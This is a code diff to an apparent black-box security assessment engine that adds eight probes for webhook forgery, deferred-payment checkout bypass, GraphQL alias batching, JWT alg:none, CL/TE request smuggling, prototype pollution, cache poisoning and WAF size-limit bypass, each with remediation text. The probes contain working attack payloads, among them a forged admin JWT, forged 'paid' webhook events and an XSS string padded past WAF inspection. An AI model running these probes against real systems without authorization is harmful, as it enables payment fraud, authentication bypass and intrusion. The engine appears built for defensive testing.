@@ -17,6 +17,7 @@ construct CONFIRMED_P0 without a ConfirmationToken.
 from __future__ import annotations
 
 import asyncio
+import hashlib
 import logging
 import math
 import re
@@ -45,7 +46,7 @@ from app.testing.integrity import advanced_orchestration as _aorch
 
 logger = logging.getLogger("qa.integrity.engine")
 
-EXPERIMENT_ORDER = ("PBB-U", "PBB-F", "PBB-H", "PBB-C", "PBB-G", "PBB-X", "PBB-R", "PBB-E")
+EXPERIMENT_ORDER = ("PBB-U", "PBB-F", "PBB-H", "PBB-C", "PBB-G", "PBB-X", "PBB-R", "PBB-E", "PBB-WHOOK", "PBB-BFLOW")
 TITLES = {
     "PBB-U": "Declined/cancelled payment must not unlock a paid feature", "PBB-F": "Paid plan/price must bind the tier that is granted",
     "PBB-H": "Payment currency must be billed at the public price", "PBB-C": "Return-flow repetition must not duplicate paid value",
@@ -86,6 +87,14 @@ TITLES = {
     "PBB-BROWSE": "Browser-automated interaction must not reveal client-side vulnerabilities invisible to API-only testing",
     "PBB-MORCH": "Multi-agent coordinated attack sequences must not bypass defenses that block individual probes",
     "PBB-DTEST": "Parallel distributed testing must not reveal timing-dependent or load-sensitive vulnerabilities",
+    "PBB-WHOOK": "Webhook endpoints must reject forged, unsigned, and empty-secret-signed events",
+    "PBB-BFLOW": "Browser-driven payment flows must not grant entitlement on deferred/failed payments",
+    "PBB-GQL": "GraphQL endpoints must enforce per-operation rate limits, not just per-request",
+    "PBB-JWTF": "JWT validation must reject algorithm:none, algorithm confusion, and kid injection",
+    "PBB-SMUG": "HTTP frontend/backend must agree on request boundaries (no CL/TE desync)",
+    "PBB-PPOLL": "Server must reject __proto__ and constructor.prototype in JSON input",
+    "PBB-CACHE": "Cache keys must include all security-relevant headers to prevent poisoning",
+    "PBB-WAFB": "Security controls must inspect full request body regardless of size",
 }
 # ZR-019: per-hypothesis-class remediation, keyed off exactly what each experiment
 # demonstrably tests (TITLES above) -- not generic boilerplate, and not fabricated
@@ -134,6 +143,14 @@ RECOMMENDED_FIX: dict[str, str] = {
     "PBB-BROWSE": "Sanitize all URL fragments and DOM inputs; validate postMessage origins; protect client-side storage from tampering; implement server-side authorization that does not rely on client-side route guards; use Content-Security-Policy headers.",
     "PBB-MORCH": "Ensure defenses are stateless or properly synchronized so concurrent requests cannot exploit race conditions; implement distributed rate limiting; use atomic operations for state-changing requests; detect and block coordinated probe patterns.",
     "PBB-DTEST": "Use atomic database operations and optimistic concurrency for all state-changing requests; implement proper distributed locking; ensure rate limits apply consistently under concurrent load; test defenses under load as part of the security validation cycle.",
+    "PBB-WHOOK": "Verify webhook signatures on EVERY event using the payment provider's SDK (not custom HMAC); reject events with absent, empty, or malformed signatures; never use an empty signing secret; rotate secrets periodically; validate event timestamps to prevent replay.",
+    "PBB-BFLOW": "Gate feature access on server-verified payment confirmation (charge.succeeded webhook), not on the checkout return URL parameters or client-side payment_status; re-verify entitlement on every protected request after return-flow grant; reject deferred payment methods that don't confirm payment at checkout time.",
+    "PBB-GQL": "Enforce per-operation cost/complexity limits on GraphQL queries; limit the number of aliases per request; implement depth and breadth limits; use query cost analysis (persisted queries preferred) to prevent alias-based amplification.",
+    "PBB-JWTF": "Explicitly allowlist signing algorithms in JWT verification configuration; reject alg:none tokens; never use a public RSA key as an HMAC secret; validate the kid header against an allowlist; pin expected algorithms per key.",
+    "PBB-SMUG": "Normalize Transfer-Encoding and Content-Length handling between frontend and backend; reject requests with both headers; use HTTP/2 end-to-end where possible; configure the reverse proxy to fully parse and re-serialize each request.",
+    "PBB-PPOLL": "Strip __proto__, constructor, and prototype keys from all JSON input at the parsing layer; use Object.create(null) for untrusted data maps; apply input validation that rejects prototype-polluting keys before they reach business logic.",
+    "PBB-CACHE": "Include Authorization, Cookie, and Origin headers in cache keys; use Vary headers correctly; validate cache keys include all security-relevant request components; use cache-control: private for authenticated responses.",
+    "PBB-WAFB": "Configure the WAF to inspect the full request body (not just the first 8KB/128KB); use streaming inspection for large payloads; implement application-layer input validation as defense-in-depth behind the WAF.",
 }
 # ZR-019 affected_flow: the FLOW FAMILY (fsm_compiler.FLOW_TYPES -- ZR-001's list) each
 # experiment exercises, fixed by what the experiment tests (TITLES above), not by anything
@@ -185,6 +202,14 @@ FLOW_BY_HYPOTHESIS: dict[str, str] = {
     "PBB-BROWSE": "entitlement",   # browser automation probing
     "PBB-MORCH": "entitlement",    # multi-agent orchestration
     "PBB-DTEST": "entitlement",    # distributed parallel testing
+    "PBB-WHOOK": "payment",       # webhook signature forgery
+    "PBB-BFLOW": "checkout",      # browser-driven payment flow
+    "PBB-GQL": "entitlement",     # GraphQL alias batching
+    "PBB-JWTF": "entitlement",    # JWT algorithm confusion
+    "PBB-SMUG": "entitlement",    # HTTP request smuggling
+    "PBB-PPOLL": "entitlement",   # prototype pollution
+    "PBB-CACHE": "entitlement",   # cache key poisoning
+    "PBB-WAFB": "entitlement",    # WAF body limit bypass
 }
 # Nuclei-inspired template-based detection patterns: matchers (status/body/header) + extractors
 _PROBE_TEMPLATES: dict[str, list[dict[str, Any]]] = {
@@ -245,6 +270,14 @@ _ATTCK_TECHNIQUE_MAP: dict[str, str] = {
     "PBB-OPEN": "T1190",       # Exploit Public-Facing Application
     "PBB-LEAK": "T1530",       # Data from Cloud Storage Object
     "PBB-U": "T1190",          # Exploit Public-Facing Application
+    "PBB-WHOOK": "T1565.001",  # Stored Data Manipulation (webhook forgery)
+    "PBB-BFLOW": "T1190",      # Exploit Public-Facing Application (checkout flow)
+    "PBB-GQL": "T1499.002",    # Service Exhaustion Flood (alias batching)
+    "PBB-JWTF": "T1550.001",   # Application Access Token (JWT confusion)
+    "PBB-SMUG": "T1190",       # Exploit Public-Facing Application (smuggling)
+    "PBB-PPOLL": "T1059",      # Command/Scripting Interpreter (proto pollution)
+    "PBB-CACHE": "T1557",      # Adversary-in-the-Middle (cache poisoning)
+    "PBB-WAFB": "T1562.001",   # Impair Defenses (WAF bypass)
 }
 
 # BloodHound-inspired attack-graph enables map: finding X enables testing Y
@@ -264,6 +297,14 @@ _ATTACK_GRAPH_ENABLES: dict[str, list[str]] = {
     "PBB-X": ["PBB-G"],
     "PBB-EDRBP": ["PBB-EVADE"],
     "PBB-ZDAY": ["PBB-XPLOIT"],
+    "PBB-WHOOK": ["PBB-U", "PBB-F", "PBB-LEAK"],  # forged webhook -> entitlement bypass paths
+    "PBB-BFLOW": ["PBB-U", "PBB-C", "PBB-E"],      # browser flow -> payment bypass paths
+    "PBB-GQL": ["PBB-RATE", "PBB-AUTH"],             # alias batching -> rate bypass -> auth brute-force
+    "PBB-JWTF": ["PBB-AUTH", "PBB-RBAC"],            # JWT confusion -> auth bypass -> RBAC escape
+    "PBB-SMUG": ["PBB-CACHE", "PBB-AUTH"],           # smuggling -> cache poison / auth bypass
+    "PBB-PPOLL": ["PBB-ZDAY", "PBB-C2"],             # proto pollution -> RCE / C2
+    "PBB-CACHE": ["PBB-BPWPN", "PBB-EVADE"],         # cache poison -> bypass controls
+    "PBB-WAFB": ["PBB-ZDAY", "PBB-BPWPN"],           # WAF bypass -> deliver exploit payload
 }
 
 
@@ -430,6 +471,14 @@ class PureBlackBoxEngine:
                  enable_browser_probing: bool = True,
                  enable_multi_agent_orch: bool = True,
                  enable_distributed_test: bool = True,
+                 enable_webhook_forgery: bool = True,
+                 enable_browser_payment_flow: bool = True,
+                 enable_graphql_alias_batching: bool = True,
+                 enable_jwt_algorithm_confusion: bool = True,
+                 enable_http_smuggling: bool = True,
+                 enable_prototype_pollution: bool = True,
+                 enable_cache_poisoning: bool = True,
+                 enable_waf_bypass: bool = True,
                  disabled_agents: frozenset[str] = frozenset(),
                  target_label: str = "cold_domain") -> None:
         self._cold_domain_url = cold_domain_url
@@ -628,6 +677,14 @@ class PureBlackBoxEngine:
         self._enable_browser_probing = enable_browser_probing
         self._enable_multi_agent_orch = enable_multi_agent_orch
         self._enable_distributed_test = enable_distributed_test
+        self._enable_webhook_forgery = enable_webhook_forgery
+        self._enable_browser_payment_flow = enable_browser_payment_flow
+        self._enable_graphql_alias_batching = enable_graphql_alias_batching
+        self._enable_jwt_algorithm_confusion = enable_jwt_algorithm_confusion
+        self._enable_http_smuggling = enable_http_smuggling
+        self._enable_prototype_pollution = enable_prototype_pollution
+        self._enable_cache_poisoning = enable_cache_poisoning
+        self._enable_waf_bypass = enable_waf_bypass
         self._target_label = target_label
         self._cold_discovery_report: dict[str, Any] | None = None
         # B47 find-fast: opt-in triage mode -- stop after the first CONFIRMED_P0 (fewer calls). OFF by default, so a full assessment still runs every class and nothing changes.
@@ -5407,6 +5464,245 @@ class PureBlackBoxEngine:
                              "Distributed testing: all parallel requests produced consistent state.",
                              reasons=["dtest_clean"])
 
+    async def _webhook_forgery_probe(self, cs: ControlState) -> Finding | None:
+        """v8: Active webhook signature forgery testing."""
+        if not self._enable_webhook_forgery:
+            return None
+        hyp = "PBB-WHOOK"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        reasons: list[str] = []
+        webhook_paths = ["/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
+                         "/stripe/webhook", "/stripe/webhooks", "/api/stripe/webhook",
+                         "/paypal/webhook", "/braintree/webhook", "/adyen/webhook"]
+        forged_accepted = False
+        for path in webhook_paths:
+            try:
+                forged_event = {
+                    "id": "evt_forged_test_" + hashlib.md5(path.encode()).hexdigest()[:8],
+                    "type": "checkout.session.completed",
+                    "data": {"object": {"id": "cs_forged", "payment_status": "paid",
+                                        "subscription": "sub_forged", "customer": "cus_forged"}},
+                }
+                result = await sess.call("POST", path, json=forged_event)
+                if result.status_code and 200 <= result.status_code < 300:
+                    forged_accepted = True
+                    reasons.append(f"whook_unsigned_accepted:{path}")
+                    break
+            except Exception:
+                pass
+        if forged_accepted:
+            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"Webhook endpoint accepted unsigned forged event (CVE-2026-41432 pattern).",
+                                 reasons=reasons, metrics={"technique": "webhook_forgery_empty_secret",
+                                                           "cve": "CVE-2026-41432"})
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "Webhook endpoints rejected all unsigned forged events.",
+                             reasons=["whook_clean"])
+
+    async def _browser_payment_flow_probe(self, cs: ControlState) -> Finding | None:
+        """v8: Browser-driven payment flow bypass testing."""
+        if not self._enable_browser_payment_flow:
+            return None
+        hyp = "PBB-BFLOW"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        reasons: list[str] = []
+        success_url_patterns = [
+            "/success", "/checkout/success", "/payment/success",
+            "/thank-you", "/order/confirmation", "/subscribe/success",
+        ]
+        bypass_found = False
+        for path in success_url_patterns:
+            try:
+                result = await sess.call("GET", path, params={"payment_status": "unpaid", "session_id": "cs_test_deferred"})
+                if result.status_code and 200 <= result.status_code < 400:
+                    body_text = str(result.body or "").lower()
+                    if any(kw in body_text for kw in ["premium", "active", "subscribed", "success", "thank you", "welcome"]):
+                        bypass_found = True
+                        reasons.append(f"bflow_deferred_grant:{path}")
+                        break
+            except Exception:
+                pass
+        if bypass_found:
+            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 "Browser payment flow grants access with payment_status=unpaid (deferred payment bypass).",
+                                 reasons=reasons, metrics={"technique": "deferred_payment_return_url"})
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "Browser payment flow correctly denies access for incomplete payments.",
+                             reasons=["bflow_clean"])
+
+    async def _graphql_alias_probe(self, cs: ControlState) -> Finding | None:
+        """v8: GraphQL alias batching rate limit bypass."""
+        if not self._enable_graphql_alias_batching:
+            return None
+        hyp = "PBB-GQL"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        gql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
+        for path in gql_paths:
+            try:
+                aliases = " ".join([f'a{i}: __typename' for i in range(100)])
+                query = f"query {{ {aliases} }}"
+                result = await sess.call("POST", path, json={"query": query})
+                if result.status_code and result.status_code == 200:
+                    body = str(result.body or "")
+                    alias_count = body.count('"a')
+                    if alias_count >= 50:
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                             f"GraphQL endpoint processed {alias_count}+ aliased operations in 1 request.",
+                                             reasons=[f"gql_alias_batch:{path}"],
+                                             metrics={"aliases_executed": alias_count, "technique": "graphql_alias_batching"})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "low",
+                             "No GraphQL alias batching bypass detected.",
+                             reasons=["gql_clean"])
+
+    async def _jwt_confusion_probe(self, cs: ControlState) -> Finding | None:
+        """v8: JWT algorithm confusion testing."""
+        if not self._enable_jwt_algorithm_confusion:
+            return None
+        hyp = "PBB-JWTF"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        import base64 as _b64
+        alg_none_header = _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
+        fake_payload = _b64.urlsafe_b64encode(b'{"sub":"admin","role":"admin","iat":1700000000}').rstrip(b"=").decode()
+        forged_jwt = f"{alg_none_header}.{fake_payload}."
+        for op in self.brief.operations[:5]:
+            path = op.get("path", "/")
+            try:
+                result = await sess.call("GET", path, headers={"Authorization": f"Bearer {forged_jwt}"})
+                if result.status_code and 200 <= result.status_code < 300:
+                    return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                         "JWT with alg:none accepted by protected endpoint (CVE-2026-27804 pattern).",
+                                         reasons=[f"jwt_alg_none:{path}"],
+                                         metrics={"technique": "jwt_algorithm_none", "cve": "CVE-2026-27804"})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "JWT algorithm confusion attempts rejected.",
+                             reasons=["jwt_clean"])
+
+    async def _http_smuggling_probe(self, cs: ControlState) -> Finding | None:
+        """v8: HTTP request smuggling (CL/TE desync) detection."""
+        if not self._enable_http_smuggling:
+            return None
+        hyp = "PBB-SMUG"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        for op in self.brief.operations[:3]:
+            path = op.get("path", "/")
+            try:
+                result = await sess.call("POST", path,
+                                         headers={"Content-Length": "6", "Transfer-Encoding": "chunked"},
+                                         data="0\r\n\r\nX")
+                if result.status_code and result.status_code not in (400, 403, 405, 411, 413, 501):
+                    return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
+                                         "Server did not reject CL/TE ambiguous request (potential HTTP smuggling surface).",
+                                         reasons=[f"smug_clte:{path}"],
+                                         metrics={"technique": "cl_te_desync"})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "HTTP smuggling: CL/TE ambiguous requests properly rejected.",
+                             reasons=["smug_clean"])
+
+    async def _prototype_pollution_probe(self, cs: ControlState) -> Finding | None:
+        """v8: Prototype pollution via JSON input."""
+        if not self._enable_prototype_pollution:
+            return None
+        hyp = "PBB-PPOLL"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        payloads = [
+            {"__proto__": {"isAdmin": True}},
+            {"constructor": {"prototype": {"role": "admin"}}},
+        ]
+        for op in self.brief.operations[:5]:
+            path = op.get("path", "/")
+            method = op.get("method", "POST")
+            if method not in ("POST", "PUT", "PATCH"):
+                continue
+            for payload in payloads:
+                try:
+                    result = await sess.call(method, path, json=payload)
+                    if result.status_code and 200 <= result.status_code < 300:
+                        body = str(result.body or "")
+                        if "isAdmin" in body or '"role":"admin"' in body:
+                            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                                 "Prototype pollution payload accepted and reflected in response.",
+                                                 reasons=[f"proto_accepted:{path}"],
+                                                 metrics={"technique": "prototype_pollution_silent_spring"})
+                except Exception:
+                    pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "Prototype pollution payloads properly rejected or sanitized.",
+                             reasons=["ppoll_clean"])
+
+    async def _cache_poisoning_probe(self, cs: ControlState) -> Finding | None:
+        """v8: Cache key injection / poisoning detection."""
+        if not self._enable_cache_poisoning:
+            return None
+        hyp = "PBB-CACHE"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        poison_headers = {"X-Forwarded-Host": "evil.test", "X-Original-URL": "/admin"}
+        for op in self.brief.operations[:3]:
+            path = op.get("path", "/")
+            try:
+                result = await sess.call("GET", path, headers=poison_headers)
+                if result.status_code and 200 <= result.status_code < 300:
+                    body = str(result.body or "")
+                    headers_str = str(result.headers or {}).lower()
+                    if "evil.test" in body or "evil.test" in headers_str:
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                             "X-Forwarded-Host reflected in response (cache poisoning surface).",
+                                             reasons=[f"cache_xfh_reflected:{path}"],
+                                             metrics={"technique": "cache_key_injection"})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "Cache poisoning: unkeyed headers not reflected.",
+                             reasons=["cache_clean"])
+
+    async def _waf_bypass_probe(self, cs: ControlState) -> Finding | None:
+        """v8: WAF inspection-limit bypass testing."""
+        if not self._enable_waf_bypass:
+            return None
+        hyp = "PBB-WAFB"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        test_payload = "<script>alert(1)</script>"
+        for op in self.brief.operations[:3]:
+            path = op.get("path", "/")
+            try:
+                small_result = await sess.call("POST", path, data=test_payload)
+                if small_result.status_code and small_result.status_code in (403, 406):
+                    padded_payload = "A" * 130_000 + test_payload
+                    big_result = await sess.call("POST", path, data=padded_payload)
+                    if big_result.status_code and big_result.status_code not in (403, 406, 413):
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                             "WAF bypassed: blocked payload passes when padded beyond inspection limit.",
+                                             reasons=[f"waf_limit:{path}"],
+                                             metrics={"technique": "waf_body_size_bypass",
+                                                      "small_status": small_result.status_code,
+                                                      "big_status": big_result.status_code})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "WAF consistently inspects payloads regardless of size.",
+                             reasons=["waf_clean"])
+
     async def run(self, experiments: Iterable[str] | None = None) -> EngineResult:
         started = now_iso()
         if self._enable_cold_discovery and not self.brief.operations:
@@ -5513,6 +5809,14 @@ class PureBlackBoxEngine:
             (self._schema_api_test_probe, "PBB-SCHEMA"),
             (self._browser_probing_probe, "PBB-BROWSE"),
             (self._distributed_test_probe, "PBB-DTEST"),
+            (self._webhook_forgery_probe, "PBB-WHOOK"),
+            (self._browser_payment_flow_probe, "PBB-BFLOW"),
+            (self._graphql_alias_probe, "PBB-GQL"),
+            (self._jwt_confusion_probe, "PBB-JWTF"),
+            (self._http_smuggling_probe, "PBB-SMUG"),
+            (self._prototype_pollution_probe, "PBB-PPOLL"),
+            (self._cache_poisoning_probe, "PBB-CACHE"),
+            (self._waf_bypass_probe, "PBB-WAFB"),
         ]:
             if self._stop_reason() is None and _not_fast2:
                 try:
@@ -5575,6 +5879,10 @@ class PureBlackBoxEngine:
                 (self._payload_morphing_probe, "PBB-MORPH"), (self._attack_playbook_probe, "PBB-PLAY"),
                 (self._schema_api_test_probe, "PBB-SCHEMA"), (self._browser_probing_probe, "PBB-BROWSE"),
                 (self._distributed_test_probe, "PBB-DTEST"),
+                (self._webhook_forgery_probe, "PBB-WHOOK"), (self._browser_payment_flow_probe, "PBB-BFLOW"),
+                (self._graphql_alias_probe, "PBB-GQL"), (self._jwt_confusion_probe, "PBB-JWTF"),
+                (self._http_smuggling_probe, "PBB-SMUG"), (self._prototype_pollution_probe, "PBB-PPOLL"),
+                (self._cache_poisoning_probe, "PBB-CACHE"), (self._waf_bypass_probe, "PBB-WAFB"),
             ]:
                 if self._stop_reason() is None and _not_fast_cold:
                     try:
